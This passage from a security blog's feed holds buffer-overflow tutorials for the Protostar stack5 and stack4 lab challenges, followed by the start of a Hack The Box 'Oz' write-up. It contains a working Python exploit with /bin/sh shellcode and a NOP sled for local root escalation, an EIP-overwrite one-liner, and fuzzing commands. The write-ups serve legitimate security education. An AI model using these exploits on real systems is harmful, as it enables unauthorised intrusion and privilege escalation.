&lt;h4 id=&quot;basically-no-operation-is-used-to-make-sure-that-our-exploit-doesnt-fail--because-we-wont-always-point-to-the-right-address--so-we-add-stuff-that-doesnt-do-anything-and-we-point-to-them--then-when-the-program-executes-it-will-reach-those-nops-and-keeps-executing-them-does-nothing-until-it-reaches-the-shellcode&quot;&gt;Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;building-the-exploit&quot;&gt;Building the exploit&lt;/h3&gt;
&lt;h4 id=&quot;in-the-last-challenges-a-single-python-print-statement-solved-it-this-time-it-will-be-a-mess-so-we-will-create-a-small-exploit-with-python&quot;&gt;In the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python.&lt;/h4&gt;
&lt;h4 id=&quot;first-thing-we-will-import-a-module-called-struct--i-will-explain-why-in-a-moment&quot;&gt;First thing we will import a module called struct , I will explain why in a moment.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;import struct&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-create-a-variable-the-holds-the-padding-the-chars-to-fill-the-buffer&quot;&gt;Then we will create a variable the holds the padding (the chars to fill the buffer)&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pad = &quot;\x41&quot; * 76&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-it-fills-the-buffer-it-will-hit-the-eip--we-need-the-new-eip-address-that-we-will-assign--as-i-said-above-we-need-it-to-be-the-address-of-the-following-instruction-4-bytes-after-the-original-eip-address-so-it-will-be-0xbffff77c--4--google-can-simply-give-you-the-answer-d--it-will-be-0xbffff780--we-will-add-that-value-to-a-variable-but-remember-we-need-it-in-reverse--thats-why-struct-is-important-if-you-do-import-structstructpacki--0xbffff780-from-the-python-interpreter-it-will-print-x80xf7xffxbf--it-makes-life-easier-d&quot;&gt;After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff77c + 4&lt;/code&gt; , google can simply give you the answer :D . it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff780&lt;/code&gt; . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do &lt;code class=&quot;highlighter-rouge&quot;&gt;import struct;struct.pack(&quot;I&quot; , 0xbffff780)&lt;/code&gt; from the python interpreter it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;\x80\xf7\xff\xbf&lt;/code&gt; , it makes life easier :D&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EIP = struct.pack(&quot;I&quot;, 0xbffff780)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-comes-our-shellcode&quot;&gt;Then comes our shellcode&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;last-thing-is-the-nop--it-can-be-anything--so-100-chars-will-be-good&quot;&gt;Last thing is the NOP , it can be anything , so 100 chars will be good&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;NOP = &quot;\x90&quot; * 100&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;ok-our-exploit-is-ready--we-just-need-to-print-out-the-final-payload-so-&quot;&gt;Ok our exploit is ready , we just need to print out the final payload so :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;print pad + EIP + NOP + shellcode&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-script-&quot;&gt;Let’s take a look at the script :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import struct
pad = &quot;\x41&quot; * 76
EIP = struct.pack(&quot;I&quot;, 0xbffff780)
shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;
NOP = &quot;\x90&quot; * 100
print pad + EIP + NOP + shellcode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF5/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;applying-the-exploit&quot;&gt;Applying the exploit&lt;/h3&gt;
&lt;h4 id=&quot;now-its-show-time--lets-test-it-out&quot;&gt;Now it’s show time ! let’s test it out.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt; python /tmp/stack5.py | ./stack5&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-a-root-shell-&quot;&gt;And we got a root shell !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous articles&lt;/a&gt; , Tweet about the article if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-buffer-overflow-article--buffer-overflow-practical-examples--exploiting-eip---protostar-stack4&quot;&gt;Previous Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof4/&quot;&gt;Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the first buffer overflow article) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in. Read the previous articles first , if you haven’t done yet. ./Stack5 We have the source like all the previous challenges but this time it’s actually not important. #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about char buffer[64]; ? like stack4 if we tried 64 chars it won’t even crash. with that being said let’s start. As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step) python -c &quot;print 'A' * 100&quot; | ./stack5 Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit pattern_create and pattern_offset , I explained how does this work in stack3 ./pattern_create.rb -l 100 Then we will run gdb and create a break point at main() , run the program after the break point we make it continue then pass our pattern break main run c It crashes at 0x63413563 , now we will use pattern_offset ./pattern_offset.rb -q 63413563 And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use find to know that find /opt/protostar/bin/ -perm -4000 | grep stack5 And we get /opt/protostar/bin/stack5 , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the grep command and it will list all suid binaries in the specified directory. Fun with gdb , finding EIP Now let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of win() function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment. We will set the disassembly flavor to intel set disassembly-flavor intel Then we will disassemble the main function disassemble main By looking at that we can identify the best place to set our break point , and it’s gonna be before the leave instruction , leave is right before the return instruction , next to leave we see the address 0x080483d9 so we will type : break *0x080483d9 Then we will run the program and pass any input , many A’s is always good It will execute and stop at the breakpoint , by typing info frame we can get the EIP address info frame The last 2 lines show saved registers : eip at 0xbffff77c Another way to get the buffer size Let’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it .. Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer. If we type x/24wx $esp it will show us (x/) 24 (24wx) words at the top of the stack ($esp). x/24wx $esp At the second line we see this address 0xbffff730 and it holds values of 0x41414141 and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other: p/d 0xbffff77c - 0xbffff730 And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size. Idea of the exploit before we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything. ShellCode So what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . /bin/sh for example. And this binary is suid … so if we execute shellcode that executes /bin/sh with the binary we will get a root shell. You can get shellcodes from shell-storm or from exploit-db , of course there are a lot of other resources , I’m just giving examples. This is the shellcode we are going to use for this challenge : \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80 This shellcode executes /bin/sh NOP (No Operation) Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode. Building the exploit In the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python. First thing we will import a module called struct , I will explain why in a moment. import struct Then we will create a variable the holds the padding (the chars to fill the buffer) pad = &quot;\x41&quot; * 76 After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be 0xbffff77c + 4 , google can simply give you the answer :D . it will be 0xbffff780 . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do import struct;struct.pack(&quot;I&quot; , 0xbffff780) from the python interpreter it will print \x80\xf7\xff\xbf , it makes life easier :D EIP = struct.pack(&quot;I&quot;, 0xbffff780) Then comes our shellcode shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; Last thing is the NOP , it can be anything , so 100 chars will be good NOP = &quot;\x90&quot; * 100 Ok our exploit is ready , we just need to print out the final payload so : print pad + EIP + NOP + shellcode Let’s take a look at the script : import struct pad = &quot;\x41&quot; * 76 EIP = struct.pack(&quot;I&quot;, 0xbffff780) shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; NOP = &quot;\x90&quot; * 100 print pad + EIP + NOP + shellcode Applying the exploit Now it’s show time ! let’s test it out. python /tmp/stack5.py | ./stack5 And we got a root shell ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF5/0.png" /></entry><entry><title type="html">Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4</title><link href="http://localhost:4000/binary-exploitation/bof4/" rel="alternate" type="text/html" title="Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4" /><published>2019-01-14T00:00:00+02:00</published><updated>2019-01-14T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof4</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof4/">&lt;hr /&gt;

&lt;h5 id=&quot;note--this-article-is-small-because-i-didnt-want-to-solve-stack-4-with-stack-5-as-stack-5-is-different-so-i-just-wrote-about-stack-4-quickly&quot;&gt;note : This article is small because I didn’t want to solve stack 4 with stack 5 as stack 5 is different so I just wrote about stack 4 quickly&lt;/h5&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
&lt;h4 id=&quot;hey-again-todays-article-is-going-to-be-short-so-last-time-i-solved-stack3--im-back-again-and-today-im-going-to-solve-stack4-which-is-really-interesting--its-slightly-different-from-stack3-but-that-difference-is-a-new-thing-to-see-if-we-compare-it-to-the-previous-challenges-so-lets-not-talk-too-much-and-jump-right-in&quot;&gt;Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in.&lt;/h4&gt;
&lt;h4 id=&quot;read-my-other-articles-about-buffer-overflow&quot;&gt;Read my &lt;a href=&quot;/categories&quot;&gt;other articles about buffer overflow&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF4/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stack4&quot;&gt;./stack4&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-source-code-first-&quot;&gt;Let’s take a look at the source code first :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void win()
{
 printf(&quot;code flow successfully changed\n&quot;);
}

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;very-simple--it-defines-the-win-function-then-defines-the-main-function-which-sets-a-buffer-of-64-chars-and-stores-our-input-in-it-but-wait-a-second-where-is-the-variable-that-were-gonna-overwrite--in-the-previous-challenges-we-had-a-variable-that-is-being-used-by-a-function-to-change-the-code-flow--now-what-will-we-overwrite-&quot;&gt;Very simple ! it defines the &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; function then defines the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ?&lt;/h4&gt;
&lt;h4 id=&quot;the-answer-is-the-eip-which-is-the-instruction-pointer-and-the-instruction-pointer-is-a-memory-address-that-holds-the-address-of-the-next-instruction-in-the-program-during-execution-so-if-we-overwrite-that-address-the-program-will-execute-whatever-that-address-refers-to-lets-try-to-exceed-the-buffer&quot;&gt;The answer is the &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt; which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 64&quot;&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF4/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-program-didnt-even-crash--why--because-the-return-address-is-not-directly-after-the-buffer-like-in-the-previous-challenges--lets-try-100-chars&quot;&gt;The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 100&quot;&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF4/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-program-crashed--lets-find-where-does-it-exactly-crash-like-we-did-in-the-previous-challenge-read-it-if-you-havent-done-yet&quot;&gt;The program crashed , Let’s find where does it exactly crash like we did in the &lt;a href=&quot;/binary-exploitation/bof3&quot;&gt;previous challenge&lt;/a&gt; read it if you haven’t done yet.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-create-a-pattern-with-pattern_create&quot;&gt;We will create a pattern with &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_create.rb -l 100&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF4/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-pass-it-to-the-program-in-gdb&quot;&gt;Then we will pass it to the program in gdb&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF4/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-crashes-at-0x63413563&quot;&gt;It crashes at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x63413563&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-locate-that-with-pattern_offset&quot;&gt;We locate that with pattern_offset&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_offset.rb -q 63413563&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF4/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-exact-match-at-offset-76&quot;&gt;We get exact match at offset 76&lt;/h4&gt;
&lt;h4 id=&quot;next-step-is-to-find-the-address-of-win&quot;&gt;Next step is to find the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF4/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-address-is-0x080483f4&quot;&gt;The address is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x080483f4&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-can-build-our-exploit-&quot;&gt;Now we can build our exploit :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 76 + '\xf4\x83\x04\x08'&quot; | ./stack4&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF4/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-successfully-changed-the-code-flow-&quot;&gt;And we successfully changed the code flow !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous articles&lt;/a&gt; , Tweet about the article if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-buffer-overflow-article--buffer-overflow-practical-examples--metasploit--gdb-and-objdump----protostar-stack3-&quot;&gt;Previous Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof3/&quot;&gt;Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3 &lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-buffer-overflow-article--buffer-overflow-practical-examples--shellcode-injection-and-local-privilege-escalation---protostar-stack5&quot;&gt;Next Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof5/&quot;&gt;Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">note : This article is small because I didn’t want to solve stack 4 with stack 5 as stack 5 is different so I just wrote about stack 4 quickly Introduction Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in. Read my other articles about buffer overflow ./stack4 Let’s take a look at the source code first : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void win() { printf(&quot;code flow successfully changed\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Very simple ! it defines the win function then defines the main function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ? The answer is the EIP which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer. python -c &quot;print 'A' * 64&quot; The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars python -c &quot;print 'A' * 100&quot; The program crashed , Let’s find where does it exactly crash like we did in the previous challenge read it if you haven’t done yet. We will create a pattern with pattern_create ./pattern_create.rb -l 100 Then we will pass it to the program in gdb It crashes at 0x63413563 We locate that with pattern_offset ./pattern_offset.rb -q 63413563 We get exact match at offset 76 Next step is to find the address of win() objdump -d The address is 0x080483f4 Now we can build our exploit : python -c &quot;print 'A' * 76 + '\xf4\x83\x04\x08'&quot; | ./stack4 And we successfully changed the code flow ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3 Next Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF4/0.png" /></entry><entry><title type="html">Hack The Box - Oz</title><link href="http://localhost:4000/hack-the-box/oz/" rel="alternate" type="text/html" title="Hack The Box - Oz" /><published>2019-01-12T00:00:00+02:00</published><updated>2019-01-12T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/oz</id><content type="html" xml:base="http://localhost:4000/hack-the-box/oz/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-im-back-with-another-hack-the-box-write-up--this-time-oz-has-retired-and-it-was-rated-as-a-hard-box-i-enjoyed-this-box--it-was-really-fun-it-had-some-docker-tricks-which-were-very-cool--its-a-linux-box-and-its-ip-is-10101096-so-lets-jump-right-in&quot;&gt;Hey I’m back with another Hack The Box write-up , this time Oz has retired and it was rated as a hard box. I enjoyed this box , it was really fun. It had some docker tricks which were very cool , It’s a linux box and it’s ip is 10.10.10.96 so let’s jump right in.&lt;/h4&gt;
&lt;h4 id=&quot;check-out-my-other-hack-the-box-write-ups&quot;&gt;Check out my &lt;a href=&quot;/categories&quot;&gt;other Hack The Box write-ups&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-by-running-nmap-to-scan-for-open-ports-and-services&quot;&gt;As always we will start by running nmap to scan for open ports and services.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -o nmapinitial oz.htb&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--i-added-the-ip-to-my-etchosts-file-as-ozhtb&quot;&gt;Note : I added the ip to my /etc/hosts file as oz.htb&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-only-http-on-port-80-and-8080-we-also-see-that-its-running-a-python-server&quot;&gt;And we see only http on port 80 and 8080. We also see that it’s running a python server.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;enumerating-http&quot;&gt;Enumerating http&lt;/h3&gt;
&lt;h4 id=&quot;on-port-80-theres-a-web-page-with-the-title-oz-webapi-and-its-asking-us-to-register-a-username&quot;&gt;On port 80 there’s a web page with the title “OZ Webapi” and it’s asking us to register a username.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-port-8080-we-see-a-login-page&quot;&gt;On port 8080 we see a login page.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-tried-running-gobuster-on-port-80-to-find-hidden-dirs-and-files-we-will-get-a-wildcard-response&quot;&gt;If we tried running gobuster on port 80 to find hidden dirs and files we will get a wildcard response.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-thats-because-the-server-doesnt-respond-with-404-instead-of-404--when-we-request-a-non-existing-page-the-server-responds-with-a-line-of-random-chars&quot;&gt;And that’s because the server doesn’t respond with 404. Instead of 404 , when we request a non-existing page the server responds with a line of random chars.&lt;/h4&gt;
&lt;h4 id=&quot;here-i-requested-httpozhtbanything&quot;&gt;Here I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;http://oz.htb/anything&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-this-makes-it-hard-to-enumerate-because-we-will-always-get-a-200-response-so-what-are-we-going-to-do-is-to-use-wfuzz-to-filter-the-responses-for-us&quot;&gt;And this makes it hard to enumerate because we will always get a 200 response. So what are we going to do is to use wfuzz to filter the responses for us.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -u http://oz.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 0&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-wont-show-us-any-response-with-0-lines&quot;&gt;This won’t show us any response with 0 lines.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-a-few-seconds-we-get-users&quot;&gt;After a few seconds we get /users/&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h3&gt;
&lt;h4 id=&quot;when-we-visit-users-in-the-browser-we-get-the-default-response--please-register-a-username&quot;&gt;When we visit /users/ in the browser we get the default response : please register a username.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
